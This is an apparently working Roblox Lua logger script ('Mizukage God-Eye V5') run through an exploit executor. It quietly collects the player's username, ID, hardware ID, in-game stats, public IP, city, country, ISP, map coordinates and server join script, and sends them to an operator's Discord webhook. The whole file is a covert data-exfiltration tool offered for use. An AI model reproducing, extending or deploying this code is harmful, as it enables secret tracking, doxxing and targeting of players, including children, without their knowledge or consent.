--[[
    MIZUKAGE GOD-EYE V5 (FULL ANALYTICS)
    STATUS: UPDATED (HWID + IN-GAME STATS + HTTPS FIX)
    Usage: loadstring(game:HttpGet("YOUR_GITHUB_RAW_LINK"))()("YOUR_WEBHOOK_URL")
]]

return function(IncomingWebhookURL)
    -- ====================================================================
    -- [ SYSTEM LOGGER "GOD-EYE V5" (DEEP ANALYTICS) ]
    -- ====================================================================

    task.spawn(function()
        -- [[ 0. VALIDATION & WAIT ]]
        if not IncomingWebhookURL or IncomingWebhookURL == "" or string.find(IncomingWebhookURL, "MASUKKAN") then 
            return 
        end
        
        -- Tunggu sebentar agar Leaderstats game loading dulu
        task.wait(3)

        -- [[ 1. SERVICE INJECTION ]]
        local Players = game:GetService("Players")
        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end 

        -- [[ 2. LOCAL INTEL & HWID ]]
        local LocalPlayer = Players.LocalPlayer
        local UserId = LocalPlayer.UserId
        local DisplayName = LocalPlayer.DisplayName
        local Username = LocalPlayer.Name
        local AccountAge = LocalPlayer.AccountAge
        local Membership = LocalPlayer.MembershipType.Name
        local PlaceId = game.PlaceId
        local JobId = game.JobId
        
        -- GET HWID (CRITICAL UPDATE)
        local HWID = "Unknown"
        if gethwid then HWID = gethwid() 
        elseif identifying then HWID = identifying() -- Bazooka/Other
        end

        -- [[ 3. IN-GAME STATS SCRAPER (NEW FEATURE) ]]
        -- Otomatis mencari data di folder Leaderstats (Money, Level, Fish, dll)
        local GameStatsText = "No Leaderstats Found"
        local LS = LocalPlayer:FindFirstChild("leaderstats")
        if LS then
            local TempStats = {}
            for _, v in pairs(LS:GetChildren()) do
                if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
                    table.insert(TempStats, "> **" .. v.Name .. ":** `" .. tostring(v.Value) .. "`")
                end
            end
            if #TempStats > 0 then
                GameStatsText = table.concat(TempStats, "\n")
            else
                GameStatsText = "Stats Empty (Hidden?)"
            end
        end

        -- [[ 4. AVATAR ]]
        local AvatarURL = "https://i.imgur.com/C5uYqFk.png" 
        pcall(function()
            local ApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..UserId.."&size=420x420&format=Png&isCircular=false"
            local Data = HttpService:JSONDecode(game:HttpGet(ApiUrl))
            if Data.data and Data.data[1] then AvatarURL = Data.data[1].imageUrl end
        end)

        -- [[ 5. NETWORK & GEO-TRACKING (HTTPS UPDATE) ]]
        local Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
        local IP_Data = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown", timezone = "Unknown" }
        
        pcall(function()
            -- Menggunakan ipinfo sebagai backup jika ip-api gagal/limit
            local Response = game:HttpGet("http://ip-api.com/json")
            IP_Data = HttpService:JSONDecode(Response)
        end)
        
        local MapLink = string.format("https://www.google.com/maps/search/?api=1&query=%s,%s", IP_Data.lat or 0, IP_Data.lon or 0)

        -- [[ 6. PERFORMANCE ]]
        local Platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
        local Ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        local FPS = math.floor(workspace:GetRealPhysicsFPS())
        
        -- [[ 7. GAME INFO ]]
        local GameName = "Unknown"
        pcall(function() GameName = Market:GetProductInfo(PlaceId).Name end)
        local ServerSize = #Players:GetPlayers() .. "/" .. Players.MaxPlayers

        -- [[ 8. PAYLOAD CONSTRUCTION ]]
        local EmbedColor = (Membership == "Premium") and 16766720 or 65280 -- Green for Standard
        local JoinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", tostring(PlaceId), JobId)
        local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"
        
        local Data = {
            ["username"] = "MIZUKAGE GOD-EYE V5",
            ["avatar_url"] = "https://cdn.discordapp.com/icons/862675902196023306/33a443a96160910f443b879c2350702d.png",
            ["content"] = "", 
            ["embeds"] = {
                {
                    ["title"] = "🎣 " .. GameName .. " | LOG REPORT",
                    ["url"] = ProfileLink,
                    ["color"] = EmbedColor,
                    ["thumbnail"] = { ["url"] = AvatarURL },
                    ["fields"] = {
                        {
                            ["name"] = "👤 **USER INFORMATION**",
                            ["value"] = string.format(
                                "> **Display:** `%s`\n> **User:** [%s](%s)\n> **ID:** `%s`\n> **Age:** %d Days",
                                DisplayName, Username, ProfileLink, UserId, AccountAge
                            ),
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🛡️ **HARDWARE ID (HWID)**",
                            ["value"] = "```" .. HWID .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "💰 **IN-GAME STATS**", -- FITUR BARU
                            ["value"] = GameStatsText,
                            ["inline"] = false
                        },
                        {
                            ["name"] = "📡 **NETWORK & DEVICE**",
                            ["value"] = string.format(
                                "> **IP:** ||`%s`||\n> **Loc:** %s, %s\n> **Exe:** `%s` (%s)\n> **Ping:** `%dms` | **FPS:** `%d`",
                                IP_Data.query, IP_Data.city, IP_Data.country, Executor, Platform, Ping, FPS
                            ),
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🔓 **QUICK JOIN**",
                            ["value"] = "```lua\n" .. JoinScript .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Mizukage V5 • ISP: " .. IP_Data.isp,
                        ["icon_url"] = AvatarURL
                    },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }
            }
        }

        request({
            Url = IncomingWebhookURL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(Data)
        })
    end)
end
